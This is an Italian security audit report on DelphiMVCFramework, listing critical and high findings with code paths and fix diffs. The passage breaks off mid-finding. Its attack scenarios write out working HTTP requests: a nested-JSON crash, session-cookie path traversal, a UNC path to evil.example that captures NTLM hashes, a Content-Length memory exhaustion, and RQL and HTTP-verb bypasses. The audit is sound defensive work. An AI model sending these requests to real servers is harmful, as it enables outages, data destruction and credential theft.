# DelphiMVCFramework — white-box security audit

**Data:** 2026-08-27
**Scope:** `sources/`, `ideexpert/templates/`, `lib/`, binari committati. Audit in sola lettura, autorizzato dal maintainer.
**Versione:** 3.5.0-silicon-rc6, master @ `1b60fc26`.
**Non committare questo file.**

---

> ## STATO DELLE CORREZIONI — aggiornato 2026-08-28
>
> **Tutti i Critical e tutti i Medium sono stati chiusi.** Matrice completa
> verde: 1329/1329 su classic, Indy Direct e HTTP.sys, Win32 e Win64.
>
> | | Esito |
> |---|---|
> | C-01 | Chiuso. Limite `JsonMaxNestingDepth` (default 512). **Il numero nel report è sbagliato**: non 10 KB su Win64 ma **34 KB** (8500 livelli); 10 KB si parsa senza problemi. Misurato. |
> | C-02 | Chiuso. `IsValidSessionID` alla sorgente (**entrambe** le estrazioni, non solo una) e di nuovo dove il file store costruisce il path. |
> | C-03 | Chiuso. Il flag è letto fuori dall'`if` nel middleware **e** nel filtro; il ramo con caratteri non validi ora lo alza. Scoperto correggendo: il containment check considerava la root stessa fuori da sé, quindi `/static/` dava 404 — corretto confrontando entrambi i lati col separatore finale. |
> | C-04 | Chiuso. Il limite è applicato prima di allocare, e il fallback senza `Content-Length` è limitato. Risponde 413 invece di far cadere la connessione. |
> | M-01 | Chiuso. `OnCreatePostStream` con uno stream limitato + 413. Indy non ha `MaxPostSize` in questa versione. |
> | M-02 | Chiuso. Indy usa `TNetEncoding.URL.Decode` come gli altri due host. |
> | M-03 | Chiuso. `QueryParams` è first-wins su tutti e tre gli host. Chiude anche **L-08** (WebBroker sollevava sulla chiave duplicata → 500). |
> | M-04 | Chiuso. Fuori da DEBUG solo le `EMVCException` mettono il messaggio in risposta; **tre** siti, non due. |
> | M-05 | Chiuso in parte, di proposito. `SameSite=Lax` e `HttpOnly` di default sì; **`Secure` no**: un cookie Secure su HTTP romperebbe la sessione in sviluppo per chi aggiorna da 3.4. È una decisione da prendere, non un dimenticanza. |
> | M-06 | Chiuso. Nuovo `TMVCWebRequest.PeerIp` sui tre host, usato dalla ACL. **Non coperto da test**: dal localhost non si distingue il caso. |
> | M-07 | Chiuso come warning (il default non è cambiato, per compatibilità), una volta per processo. |
> | M-08 | Chiuso. Percent-encoding dei cookie su Indy e HTTP.sys, come già faceva WebBroker. |
> | M-09 | Chiuso. Slice 206 limitata a 8 MiB, in entrambe le implementazioni. |
> | M-10 | Chiuso. Tetto di 100k chiavi + warning. |
> | M-11 | Chiuso. `:`, `*`, `?`, punto e spazio finali rifiutati su Windows. Il nome 8.3 **non** è rilevabile qui e resta aperto. |
> | M-12 | Chiuso **rifiutando**, non normalizzando: normalizzare avrebbe dato a tutti gli host il comportamento permissivo di HTTP.sys, cioè avrebbe esteso il bypass invece di chiuderlo. |
> | M-13 | Chiuso dove è rilevabile. Solo Indy conserva la lista grezza degli header; HTTP.sys li riceve già uniti dal kernel e WebBroker li espone uno alla volta. **Non coperto da test live**: l'asserzione differirebbe per host. |
> | M-14 | Documentato, come raccomandava il report stesso (il comportamento è coerente fra host). Nota di deployment nel changelog. |
> | M-15 | Chiuso. `SaveToFile` tiene la directory scelta dal chiamante e sanifica sempre il leaf. |
> | M-16 | Chiuso. `JWT_COOKIE_SECURE` a `true` nei template e nel `.env` generato. |
>
> **Restano aperti**: tutti gli High tranne H-02 (chiuso di rimbalzo dal lotto QUERY) e H-08 (mitigato dalla validazione della sorgente in C-02), e tutti i Low tranne L-08.
>
> Il changelog ha una sezione `### Security` che racconta questi fix in modo pubblicabile.

## 1. Sommario esecutivo

Il framework è messo meglio di quanto ci si aspetti da una libreria di questa età: JWT corretto (confronto
constant-time, alg pinning, rifiuto del segreto demo), `X-Forwarded-For` non fidato di default, `MVCStripCRLF`
e `MVCRedactSecret` già presenti, RQL non iniettabile a livello di *valori*. Le falle vere sono concentrate in
quattro punti: **il parser JSON senza limite di ricorsione**, **il session store su file**, **lo static-files
middleware**, e **la divergenza fra i tre host**.

Cosa fare lunedì mattina, in ordine di ritorno sull'investimento:

1. **C-01** — 10 KB di JSON annidato **uccidono il processo server** su Win64. Nessun limite di profondità in
   `JsonDataObjects.pas`, e `max_request_size` non c'entra nulla. ~8 righe di fix, un solo choke point.
2. **C-02** — Il nome del file di sessione è l'ID di sessione preso tal quale da un cookie: creazione/troncamento
   e cancellazione di file arbitrari. Una riga di validazione charset.
3. **C-03** — Il check anti-traversal dello static-files **è codice morto** in entrambi i consumer.
4. **C-04** — Su HTTP.sys si alloca `Content-Length` byte **prima** di controllare il limite: 120 byte di
   richiesta = 4 GB di commit.
5. **H-01…H-04** — Quattro divergenze fra host che rendono inaffidabile qualunque WAF/proxy davanti: dieci verbi
   HTTP eseguiti come GET su HTTP.sys, `X-HTTP-Method-Override` onorato dal solo Indy, `%2F` che inietta segmenti
   nei path parameter, e `%uXXXX` decodificato dal solo Indy.
6. **H-07** — Il wizard genera un segreto JWT hardcoded che aggira la guardia `CheckJWTSecret` appena aggiunta.
7. **Dipendenze** — OpenSSL **1.0.2u** (EOL 2019) e **1.1.1s** (EOL 2023) e libpq **10.23** (EOL 2022, CVE 8.8)
   sono committati nel repo. Vedi §4.

C-01, C-03 e H-01…H-04 sono raggiungibili nel percorso che il wizard genera di default.

---

## 2. Findings confermati

### C-01 — CRITICAL — (A) JSON annidato senza limite di ricorsione: kill del processo server con 10 KB

**File:** `sources/JsonDataObjects.pas:2317` / `:2362` (`ParseObjectBody` ⇄ `ParseObjectPropertyValue`) e
`:2449` / `:2464` (`ParseArrayBody` ⇄ `ParseArrayPropertyValue`).

Quattro procedure mutuamente ricorsive, **una coppia di stack frame per livello di annidamento, nessun contatore
di profondità in nessun punto**. Verificato: `grep -c "Depth\|MaxNest\|Recursion" sources/JsonDataObjects.pas`
→ **0** su 9977 righe. L'unico gancio del reader è `PJsonReaderProgressRec` (`:1981`), che è una callback sulla
posizione in byte, non una guardia di profondità.

**Percorso di codice:**

```
richiesta -> host -> TMVCEngine.HandleRequest            MVCFramework.pas:2830
 -> action con [MVCFromBody]
 -> TMVCEngine.FillActualParamsForAction                 MVCFramework.pas:3405 / :3410
 -> IMVCSerializer.DeserializeObject
 -> StrToJSONObject                    Serializer.JsonDataObjects.pas:3958
 -> TJsonObject.Parse -> TJsonReader.Parse               JsonDataObjects.pas:2275
```

**Misurato** (payload `{"a":` + N×`[`, stack di default 1 MB, con `try/except` attorno):

| N | Win32 | Win64 |
|---|---|---|
| 4 500 | OK | OK |
| 6 000 | OK | `EStackOverflow` sollevata |
| 10 000 | OK | **SIGSEGV, nessuna eccezione, processo morto** |
| 26 000 | `EStackOverflow` **poi** SIGSEGV (exit 139) | morto |
| 50 000 | **SIGSEGV, processo morto** | morto |

Su **Win64 un body da ~10 KB uccide il processo**: la guard page viene superata in un colpo solo, nessuna
eccezione Delphi viene mai sollevata, e il `try…except on E: Exception` di
`MVCFramework.Server.HttpSys.pas:426` non gira mai. Su Indy Direct non c'è nemmeno un `try/except` attorno a
`FEngine.HandleRequest` (`MVCFramework.Server.Indy.pas:233-255`).

**`max_request_size` non protegge.** `DEFAULT_MAX_REQUEST_SIZE = OneMiB * 5` (`Commons.pas:137`), applicato a
`MVCFramework.pas:2790/2801/2830`. Il payload letale è 10 KB — tre ordini di grandezza sotto il limite. Anche il
512 KB dello scaffold (`ideexpert/templates/dotenv.tpro:35`) non serve a nulla.

**Scenario:**

```http
POST /articles HTTP/1.1
Content-Type: application/json
Content-Length: 20006

{"a":[[[[[…  10000 volte '['  …
```

Non servono parentesi di chiusura: il reader ricorre in discesa. Ripetere dopo ogni riavvio. Non autenticato,
qualunque endpoint che accetti JSON.

**Esposto nel percorso di default?** Sì, su tutti e tre gli host, su qualunque action con `[MVCFromBody]` o che
faccia `StrToJSONObject(Context.Request.Body)` — cioè il pattern documentato.

**Fix consigliato (diff minimo)** — un contatore sul reader, ~8 righe, un solo punto:

```diff
--- a/sources/JsonDataObjects.pas
@@ TJsonReader = class(TObject)          // ~riga 1270
   private
+    FDepth: Integer;
@@ procedure TJsonReader.ParseObjectPropertyValue(const Data: TJsonObject);   // :2362
 begin
+  Inc(FDepth);
+  try
+  if FDepth > 512 then
+    raise EJsonParserException.CreateRes(@RsUnexpectedEndOfFile, LineNum, Position - LineStart);
   case FLook.Kind of
@@   Accept(jtkValue);
   end;
+  finally
+    Dec(FDepth);
+  end;
 end;
```

Stesso wrapper su `ParseArrayPropertyValue` (`:2464`). 512 è ~100× qualunque payload reale e ~10× sotto la
soglia di crash hard su Win64. Da proporre anche upstream (ahausladen/JsonDataObjects): il bug è loro.

---

### C-02 — CRITICAL — (A) Path traversal nel session store su file: create/truncate e delete di file arbitrari da un cookie

**File:** `sources/MVCFramework.Session.pas:601-604`, `:727-743`, `:657-676`, `:690-706`;
`sources/MVCFramework.pas:3352-3362`.

**Percorso di codice:**

```
Cookie: dtsessionid=...   (oppure ?dtsessionid=...)
 -> TMVCEngine.ExtractSessionIdFromRequest         MVCFramework.pas:3352
      Result := ARequest.Cookie('dtsessionid')                     :3355
      se vuoto -> ARequest.QueryStringParam('dtsessionid')         :3358
      Result := TIdURI.URLDecode(Result)    <-- %2e%2e%5c => ..\   :3361
 -> TWebContext.GetWebSession                      MVCFramework.pas:2392
 -> GetSessionFactory.CreateFromSessionID(lSessionID)              :2400
 -> TMVCWebSessionFileFactory.CreateFromSessionID    Session.pas:727
      TMVCWebSessionFile(Result).fSessionId := aSessionId          :730
 -> GetSessionFileName(fSessionId)                   Session.pas:601
      Result := TPath.Combine(fSessionFolder, aSessionId)   <-- NESSUNA VALIDAZIONE
```

Nessun controllo sul charset dell'ID, nessun containment check sul path risultante, in nessun punto della catena.

**Perché arriva alla scrittura.** `LoadFromFile` (`Session.pas:632-641`) fa `if not TFile.Exists then Exit` —
un path inesistente **non** solleva. `ExpirationTimeStamp` resta `null` e `IsExpired` (`Session.pas:294-300`)
ritorna `False` quando non ha valore, quindi `CreateFromSessionID` restituisce un oggetto sessione **valido** con
l'ID scelto dall'attaccante. `GetWebSession` chiama poi `Result.MarkAsUsed` (`MVCFramework.pas:2414`) che imposta
`fChanged := True`; a fine richiesta `TWebContext.FreeSession` (`MVCFramework.pas:2274-2280`, chiamata da
`:3245`) chiama `ApplyChanges` → `InternalApplyChanges` → **`SaveToFile`** → `TFile.CreateText(lFileName)`:
**crea o tronca un file arbitrario**.

`TPath.Combine` a 2 argomenti restituisce `Path2` se è rooted (RTL, `TPath.DoCombine`), quindi non serve neppure
il `..\`: un ID `\\attacker\share\x` o `C:\...\x` ci finisce direttamente.

**Scenario:**

```http
GET /qualunque-pagina-che-tocca-la-sessione HTTP/1.1
Host: victim
Cookie: dtsessionid=..%5c..%5cwww%5cassets%5capp.js
```

`<approot>\www\assets\app.js` viene troncato e riscritto con il contenuto del session store (timestamp, timeout,
coppie `chiave=valore`). Su una web app che mette in sessione un valore proveniente dall'utente — il caso normale
— l'attaccante controlla parte di un file servito come JavaScript dalla stessa origin: **stored XSS**. Con un
target diverso (`.env`, un `.ini`, il DB SQLite) è distruzione di dati / DoS permanente.

**Secondo primitivo — delete arbitrario.** `TWebContext.SessionStop` (`MVCFramework.pas:2462-2484`) chiama
`GetSessionFactory.TryDeleteSessionID(SId)` con lo stesso ID non validato → `TFile.Delete` su path arbitrario
(`Session.pas:690-706`). Raggiungibile da qualunque endpoint di logout e dal gestore
`EMVCSessionExpiredException` (`MVCFramework.pas:3161`).

**Esposto nel percorso di default?** Quando l'app usa il file session store — quello che il wizard emette se si
sceglie "File" (`ideexpert/templates/engineconfig.pas.tpro:241`, `webmodule.pas.tpro:248`). Il default del wizard
è memory, quindi non è *ogni* progetto, ma non serve alcuna configurazione particolare oltre alla scelta del
backend.

**Fix consigliato** — un solo punto, copre lettura, scrittura, delete ed esistenza:

```diff
--- a/sources/MVCFramework.Session.pas
 function TMVCWebSessionFileFactory.GetSessionFileName(aSessionID: String): String;
+var
+  I: Integer;
 begin
+  // L'ID arriva da un cookie/query param: non deve mai poter diventare un path.
+  // Gli ID prodotti da GenerateSessionID sono [A-Za-z0-9].
+  if aSessionID = '' then
+    raise EMVCSession.Create('Empty session id');
+  for I := 1 to Length(aSessionID) do
+    if not CharInSet(aSessionID[I], ['A'..'Z', 'a'..'z', '0'..'9']) then
+      raise EMVCSession.Create('Invalid session id');
   Result := TPath.Combine(fSessionFolder, aSessionId);
 end;
```

In aggiunta (non in alternativa): validare in `ExtractSessionIdFromRequest` (`MVCFramework.pas:3352`) e
restituire stringa vuota su ID non conforme, così anche i backend memory e database ricevono solo ID sani —
è anche la difesa di fondo per H-08.

---

### C-03 — CRITICAL — (A) Il check anti directory-traversal dello static-files è codice morto

**File:** `sources/MVCFramework.pas:4041-4075` (`TMVCStaticContents.IsStaticFile`);
`sources/MVCFramework.Middleware.StaticFiles.pas:291`, `:300-311`, `:321-348`;
`sources/MVCFramework.Filters.pas:2193-2200` (stesso difetto, flag chiamato `lAllow`).

**Il difetto — verificato riga per riga.** `IsStaticFile` imposta `AIsDirectoryTraversalAttack := True`
**solo** sul ramo che fa `Exit(False)` (`MVCFramework.pas:4069-4070`); su ogni ritorno `True` il flag è `False`.
Entrambi i chiamanti leggono il flag **dentro** `if IsStaticFile(...) then` (`StaticFiles.pas:300-311`), quindi
il `404` a `StaticFiles.pas:308` è **irraggiungibile**. Il containment check in sé
(`MVCFramework.pas:4064-4071`, `IncludeTrailingPathDelimiter` + compare case-insensitive) è **corretto**: il bug
è che il risultato viene buttato via.

Quando il flag scatta, l'esecuzione prosegue a `StaticFiles.pas:321-348`, che usano `lFullPathInfo` — calcolato
a `:291` con `TPath.Combine(fDocumentRoot, lPathInfo)`, **senza** `GetFullPath` e **senza** containment check.

**Percorso di codice:**

```
GET /static////evil.example/share/  HTTP/1.1
 -> Indy: PathInfo percent-decoded, non canonicalizzato
       MVCFramework.Indy.Request.pas:271-273 -> FRequestInfo.Document
 -> TMVCStaticFilesMiddleware.OnBeforeRouting
       :284  strip '/static/'         -> '///evil.example/share/'
       :286  Replace('/', PathDelim)  -> '\\\evil.example\share\'
       :287-290 strip UN solo '\'     -> '\\evil.example\share\'   (UNC)
       :291  TPath.Combine(root, rooted) -> ritorna il secondo -> UNC
       :300  IsStaticFile -> False (flag traversal alzato, MA IGNORATO)
       :321  TDirectory.Exists(UNC)   -> SMB in uscita dal server
       :333  SendStaticFileIfPresent(UNC + 'index.html')
```

**Scenario.** L'attaccante ospita uno share SMB. Due effetti: (a) il server apre una connessione SMB in uscita,
Windows negozia NTLM e l'hash NetNTLMv2 dell'account di servizio viene catturato; (b) l'`index.html`
dell'attaccante viene servito **dall'origin della vittima** con `Content-Type: text/html`
(`StaticFiles.pas:136`) → XSS stored con accesso pieno a cookie e sessione.

Varianti locali che non richiedono SMB, stesso check morto:

```http
GET /static/C:/Users/Administrator/Desktop/  HTTP/1.1   -> serve l'index.html di quella directory
GET /static/%2e%2e%2f%2e%2e%2f              HTTP/1.1   -> il fallback SPA (:340-347) risale e serve
                                                          l'index.html sopra il document root
```

DoS collaterale: `TDirectory.Exists` su un host UNC irraggiungibile blocca per il timeout SMB (~20 s), e il loop
SPA (`:342-345`) ritesta ogni parent — una richiesta immobilizza un worker per minuti.

**Esposto nel percorso di default?** Sì. Il wizard emette esattamente questo middleware per ogni progetto non
minimal-API: `engineconfig.pas.tpro:251` e `webmodule.pas.tpro:258`
(`TMVCStaticFilesMiddleware.Create('/static', LWwwPath)`), con `SPAWebAppSupport=True` e
`IndexDocument='index.html'`.

Host: confermato su **Indy Direct** (backend di default). Su **HTTP.sys** il path arriva già canonicalizzato dal
kernel (`HttpSys.Request.pas:283-293`), quindi le varianti `..` muoiono a monte; se il kernel collassi anche gli
slash ripetuti non è verificato (N-05) — il fix copre entrambi i casi.

**Fix consigliato** — estrarre il flag fuori dall'`if`:

```diff
--- a/sources/MVCFramework.Middleware.StaticFiles.pas
-  if TMVCStaticContents.IsStaticFile(fDocumentRoot, lPathInfo, lRealFileName,
-    lIsDirectoryTraversalAttach) then
+  lIsStaticFile := TMVCStaticContents.IsStaticFile(fDocumentRoot, lPathInfo,
+    lRealFileName, lIsDirectoryTraversalAttach);
+  if lIsDirectoryTraversalAttach then
+  begin
+    AContext.Response.StatusCode := HTTP_STATUS.NotFound;
+    AHandled := True;
+    Exit;
+  end;
+  if lIsStaticFile then
   begin
-    if lIsDirectoryTraversalAttach then
-    begin
-      AContext.Response.StatusCode := HTTP_STATUS.NotFound;
-      AHandled := True;
-      Exit;
-    end;
-
     AHandled := SendStaticFileIfPresent(AContext, lRealFileName);
```

(`lIsStaticFile: Boolean` nella sezione `var` — niente inline var, baseline 10.2.) Identica modifica a
`sources/MVCFramework.Filters.pas:2193-2200`.

Questo singolo spostamento chiude il ramo UNC, il ramo drive-letter, il ramo `%2e%2e%2f` **e** il fallback SPA,
perché il containment check interno li segnala già tutti.

---

### C-04 — CRITICAL — (A) HTTP.sys alloca `Content-Length` byte prima di controllare il limite

**File:** `sources/MVCFramework.Server.HttpSys.pas:197`, `:205`, ordine in `:424-425`.

```pascal
LContentLength := StrToInt64Def(LCLStr, -1);   // :197  header grezzo dell'attaccante
...
if LContentLength >= 0 then
begin
  SetLength(Result, LContentLength);            // :205  allocazione, nessun cap
```

L'ordine è decisivo: `DispatchAsync` chiama `ReadFullBody` (`:424`) e **solo dopo** `HandleRequest` (`:425` →
`:398` → `MVCFramework.pas:2830`, dove sta il controllo dei 5 MiB). L'allocazione avviene **dal solo header**,
prima che il loop di ricezione (`:214`) legga un byte.

**Scenario** — richiesta da ~120 byte, nessun body inviato:

```http
POST /anything HTTP/1.1
Host: victim
Content-Length: 4000000000

```

4 GB di commit + zero-fill immediati per richiesta. Dieci in parallelo → OOM. Su un host HTTP.sys a 32 bit una
sola richiesta basta a sollevare `EOutOfMemory`.

Il fallback senza `Content-Length` (`:239-263`) è anch'esso illimitato: cresce a blocchi di 64 KB fino a EOF,
quindi un body chunked infinito fa crescere il processo senza limite, e di nuovo il controllo dei 5 MiB arriva
solo a lettura finita.

**Non affetto:** WebBroker — `MVCFramework.pas:2790` controlla l'header **prima** di `ReadTotalContent` (`:2797`).
È l'unico host che ha l'ordine giusto. Indy è una variante minore: vedi M-01.

**Fix consigliato:**

```diff
--- a/sources/MVCFramework.Server.HttpSys.pas   (in ReadFullBody, dopo :200)
   LInitialLen := Length(AInitialBodyBytes);
+  { Il controllo max_request_size del motore gira DOPO questa funzione:
+    non allocare ciò che sta per essere rifiutato. }
+  if LContentLength > FEngine.Config[TMVCConfigKey.MaxRequestSize].ToInt64 then
+    raise EMVCException.Create(http_status.RequestEntityTooLarge, 'Request too large');
```

e limitare il loop di fallback a `:246` con lo stesso valore.

---

### H-01 — HIGH — (A/B) RQL: la whitelist dei nomi colonna esiste ed è disattivata in tutti i call site

**File:** `sources/MVCFramework.RQL.Parser.pas:1291-1326`, più 12 call site.

```pascal
if UsePropertyNameIfAttributeDoesntExists then
  Exit(GetFieldNameForSQL(RQLPropertyName))      // :1320-1321  nome grezzo, passa
else
  raise ERQLException.CreateFmt('Property %s does not exist ...', ...);  // :1323
```

Il parametro ha default `False` (`:94`), ma **tutti e 12 i call site lo forzano a `True`** — filtro e `sort()` di
ogni dialetto:

```
AST2FirebirdSQL.pas:147, :277    AST2MSSQL.pas:126, :262    AST2MySQL.pas:123, :254
AST2Oracle.pas:89, :193          AST2PostgreSQL.pas:88, :226    AST2SQLite.pas:98, :229
```

Verificato: `grep -rn "GetDatabaseFieldName" sources/*.pas` non restituisce alcun `False`. Il `raise` a `:1323`
è codice morto. La mapping è costruita solo dai campi con `[MVCTableField]` (`ActiveRecord.pas:2371,2444`,
assemblata a `:2970-3015`), quindi **ogni colonna fisica non dichiarata sull'entity è filtrabile e ordinabile da
un client anonimo.**

**Percorso di codice:**

```
GET /api/entities/customers?rql=...
 -> TMVCActiveRecordController.GetEntities   ActiveRecordController.pas:212 (QueryStringParam('rql'))
 -> TMVCActiveRecord.SelectRQL               ActiveRecordController.pas:230
 -> InternalSelectRQL                        ActiveRecord.pas:2652
 -> TMVCSQLGenerator.CreateSQLWhereByRQL     ActiveRecord.pas:5950
 -> TRQL2SQL.Execute / RQLCompiler.AST2SQL   RQL.Parser.pas:326 / :1256
 -> RQLFilterToSQL -> GetDatabaseFieldName(..., True)
```

**Scenario.** Entity dichiara `id, name, city`; la tabella ha anche `password_hash` e `is_admin`:

```http
GET /api/entities/customers?rql=eq(is_admin,true)
GET /api/entities/customers?rql=starts(password_hash,"$2a$10$A")
```

Il secondo è un oracolo booleano: il conteggio in `meta.page_size` dice se il prefisso corrisponde; `sort(+col)`
combinato con `limit` dà lo stesso per ordinamento. Un nome colonna sbagliato torna come 500 con il messaggio del
driver, che enumera gratis le colonne reali (aggravato da M-04). Stesso sink via POST
(`ActiveRecordController.pas:262-277`, `{"rql": "..."}` nel body), quindi le regole WAF sulla query string non
bastano.

**Non è SQL injection**: il lexer ammette solo `[A-Za-z][A-Za-z0-9_]*` con `.` come separatore
(`Parser.pas:994`) — né spazi né quote né commenti raggiungono la posizione dell'identificatore. È
**divulgazione e filtro su colonne non esposte**.

**Fix consigliato** — un file, chiude tutti e 12 i call site:

```diff
--- a/sources/MVCFramework.RQL.Parser.pas
-  if UsePropertyNameIfAttributeDoesntExists then
+  // Una mapping esiste (il caso vuoto è già uscito in cima): un nome ignoto è
+  // un typo o una sonda su una colonna non dichiarata. Fail loud.
+  if UsePropertyNameIfAttributeDoesntExists and AllowUnmappedRQLFields then
     Exit(GetFieldNameForSQL(RQLPropertyName))
   else
     raise ERQLException.CreateFmt('Property %s does not exist or is transient and cannot be used in RQL',
       [RQLPropertyName]);
```

con `AllowUnmappedRQLFields: Boolean = False` come `class var` di `TRQLCompiler`: la valvola di sfogo tiene la
regola "3.x → 3.x zero cambiamenti API" per chi filtra consapevolmente su colonne non dichiarate, ma inverte il
default a sicuro.

---

### H-02 — HIGH — (A) Dieci verbi HTTP vengono eseguiti come GET su HTTP.sys, e sollevano 500 sugli altri due

**File:** `sources/MVCFramework.HttpSys.Request.pas:236-250` (`VerbToHTTPMethod`), guardia a `:266-269`;
enum a `sources/MVCFramework.HttpSysApi.pas:70-86`.

```pascal
class function TMVCHttpSysRequest.VerbToHTTPMethod(AVerb: HTTP_VERB): TMVCHTTPMethodType;
begin
  case AVerb of
    HttpVerbGET: … HttpVerbTRACE: Result := httpTRACE;
  else
    { For PATCH and others, fall through to string-based parsing }
    Result := httpGET;          // :248
  end;
end;
```

Il commento sbaglia sul proprio chiamante. Il costruttore lo protegge così:

```pascal
:266  if (ARequest.Verb >= HttpVerbOPTIONS) and (ARequest.Verb <= HttpVerbSEARCH) then
:267    FHTTPMethod := VerbToHTTPMethod(ARequest.Verb)
:269  else FHTTPMethod := TMVCRouter.StringMethodToHTTPMetod(FHTTPMethodStr);
```

L'ordine dell'enum (`HttpSysApi.pas:70-86`) è `OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, CONNECT, TRACK,
MOVE, COPY, PROPFIND, PROPPATCH, MKCOL, LOCK, UNLOCK, SEARCH`. La guardia `OPTIONS..SEARCH` **include** dieci
verbi che il `case` non gestisce — `CONNECT, TRACK, MOVE, COPY, PROPFIND, PROPPATCH, MKCOL, LOCK, UNLOCK,
SEARCH` — e ognuno finisce sulla riga 248, **dispatchato come `httpGET`**.

(I verbi davvero ignoti — `PATCH`, `FOO` — sono `HttpVerbUnknown` = 1, cadono fuori dalla guardia e vanno al
parsing per stringa: `PATCH` funziona, `FOO` solleva → 500.)

**Scenario:**

```http
SEARCH /admin/export HTTP/1.1
Host: victim
```

- Il reverse proxy / WAF con ACL "solo GET, POST, PUT, DELETE al backend" o "GET /admin/* richiede auth": `SEARCH`
  non è GET, la regola sul GET non scatta, e una deny-list per verbo lo lascia passare senza match.
- DMVC su HTTP.sys: `FHTTPMethod = httpGET` → esegue l'action `[MVCHTTPMethod([httpGET])] /admin/export`. E
  `HTTPMethodAsString` conserva la stringa reale (`:265`), quindi anche un middleware che ricontrolla il verbo
  **come stringa** è in disaccordo con il router.
- Stessa richiesta su Indy o WebBroker: `StringMethodToHTTPMetod('SEARCH')` solleva a `Router.pas:764` → 500,
  non raggiunge mai l'action.

`TRACK` è il verbo storico dell'XST, e `CONNECT` che arriva a un handler GET è una sorpresa a sé.

**Fix consigliato** — una riga:

```diff
--- a/sources/MVCFramework.HttpSys.Request.pas   (:246-248)
   else
-    { For PATCH and others, fall through to string-based parsing }
-    Result := httpGET;
+    { I verbi che il case non copre (CONNECT, TRACK, MOVE, COPY, PROPFIND,
+      PROPPATCH, MKCOL, LOCK, UNLOCK, SEARCH) NON sono GET. }
+    Result := TMVCRouter.StringMethodToHTTPMetod(VerbToString(AVerb));
   end;
```

(oppure restringere la guardia a `:266` ai soli verbi che il `case` gestisce davvero.)

---

### H-03 — HIGH — (A) `X-HTTP-Method-Override` cambia il verbo sul solo Indy, e il codice di override del framework non funziona

**Due bug distinti che si combinano.**

**(a) Indy onora l'override; gli altri due no.** `IdHTTPHeaderInfo.pas:966`:
`FMethodOverride := FRawHeaders.Values['X-HTTP-Method-Override']`. `IdCustomHTTPServer.pas:1340-1356`: per un
**POST** Indy sostituisce il comando con `MethodOverride`, o `X-HTTP-Method`, o `X-METHOD-OVERRIDE`, e assegna
`LRequestInfo.FCommand := LCmd`. Quel `FCommand` è esattamente ciò che
`sources/MVCFramework.Indy.Request.pas:278/283/589` restituiscono.

```http
POST /api/users/1 HTTP/1.1
X-HTTP-Method-Override: DELETE
Content-Length: 0
```

Su **Indy Direct** questa richiesta esegue l'action **DELETE**. Il proxy vede un POST: passa un'ACL "DELETE è
bloccato", viene loggato come POST, e le regole CSRF/rate-limit indicizzate sul verbo non scattano. Su HTTP.sys e
WebBroker esegue la route POST (404/405).

**(b) Il supporto override di DMVC è un no-op.** `sources/MVCFramework.pas:2018-2031`:

```pascal
lOverriddenMethod := Headers[TMVCConstants.X_HTTP_Method_Override];
if lOverriddenMethod.IsEmpty then Exit(HTTPMethod)
else Result := TMVCRouter.StringMethodToHTTPMetod(HTTPMethodAsString);   // <-- non lOverriddenMethod
```

Il ramo `else` ri-parsa il verbo **reale**, mai l'override. Due conseguenze: l'override documentato dal framework
non ha mai funzionato su nessun host (quello che si osserva su Indy viene interamente da Indy); e su HTTP.sys
inviare un `X-HTTP-Method-Override` *qualsiasi* sposta la richiesta dal percorso enum a quello per stringa,
quindi `SEARCH /x` + quell'header dà 500 mentre `SEARCH /x` da solo dà il dispatch GET di H-02. Un header di
override spazzatura è un fingerprint affidabile dell'host.

**Fix consigliato.** Decidere esplicitamente se l'override è supportato, e far concordare i tre host.
Il minimo indispensabile è correggere il bug (b):

```diff
--- a/sources/MVCFramework.pas   (:2029)
-    Result := TMVCRouter.StringMethodToHTTPMetod(HTTPMethodAsString);
+    Result := TMVCRouter.StringMethodToHTTPMetod(lOverriddenMethod);
```

…**ma solo insieme** alla decisione di supportarlo: se l'override non è voluto (ed è la scelta più sicura, dato
che aggira ogni ACL per verbo a monte), la cosa giusta è rimuovere il ramo e disattivare l'override in Indy
impostando `TIdHTTPServer` per non consultare quegli header.

---

### H-04 — HIGH — (A) `%2F` in un path parameter inietta segmenti di path, e solo su due host su tre

**File:** `sources/MVCFramework.Router.pas:611`, `:455`, `:597`, `:558`;
`sources/MVCFramework.Commons.pas:134` (`URL_MAPPED_PARAMS_ALLOWED_CHARS`);
`sources/MVCFramework.pas:2893-2897`.

`Router.pas:611`: `lParValue := TIdURI.URLDecode(lMatch.Groups[I].Value)` — ogni parametro catturato viene
percent-decodificato **dopo** che la regex ha matchato. E la classe di cattura (`Commons.pas:134`) contiene `%`,
`\_`, `\.` e `\x2D` ma **non `/`**. Quindi `%2F` è catturabile e si decodifica in `/` dentro il parametro.

Il dispatcher sceglie il path grezzo quando disponibile (`MVCFramework.pas:2893-2897`), e `Router.pas:455`
(`TIdURI.PathEncode`) preserva verbatim un `%HH` esistente.

**Scenario**, su una route `[MVCPath('/api/files/($name)')]`:

```http
GET /api/files/report%2F..%2F..%2Fweb.config HTTP/1.1
```

- **Indy / WebBroker**: la regex vede un solo segmento → match; `$name` = `report/../../web.config`. Un'action che
  fa `TFile.ReadAllText(BaseDir + name)` traversa.
- **HTTP.sys**: il kernel decodifica e canonicalizza prima → il path è `/web.config` (o un 400) → la route non
  matcha affatto.

Il WAF davanti, che decodifica prima di matchare, vede `/api/files/report/../../web.config` (tre segmenti in più,
probabilmente bloccato o instradato altrove); DMVC su Indy vede un match a segmento singolo e passa la traversal
all'action. **Stesso binario, stesso controller, due esiti diversi per host.**

Problema gemello: `.` è nel set dei caratteri ammessi e nulla in `Router.pas` rifiuta `..`, quindi
`GET /api/files/..` matcha `($name)` con `$name = '..'` su **tutti** gli host.

**Fix consigliato** — un solo punto, tutti gli host, chiude anche il `..`:

```diff
--- a/sources/MVCFramework.Router.pas   (:611)
   lParValue := TIdURI.URLDecode(lMatch.Groups[I].Value);
+  // Un path parameter è UN segmento: dopo la decodifica non può contenere un
+  // separatore né un dot-segment, altrimenti il proxy davanti e il router
+  // vedono due URL diverse.
+  if (Pos('/', lParValue) > 0) or (Pos('\', lParValue) > 0) or
+     (lParValue = '..') or (lParValue = '.') then
+    Exit(False);   // nessun match: la route non è questa
```

In alternativa, togliere `%` da `URL_MAPPED_PARAMS_ALLOWED_CHARS` (`Commons.pas:134`) — più drastico, rompe i
parametri che legittimamente contengono caratteri codificati.

---

### H-05 — HIGH — (A) CRLF injection / response splitting: `MVCStripCRLF` copre solo `SetCustomHeader`

**File:** guardia a `sources/MVCFramework.Commons.pas:951-954`, applicata **solo** a tre call site
(`Indy.Response.pas:271`, `HttpSys.Response.pas:418`, `WebBroker.Response.pas:159`, tutti dentro
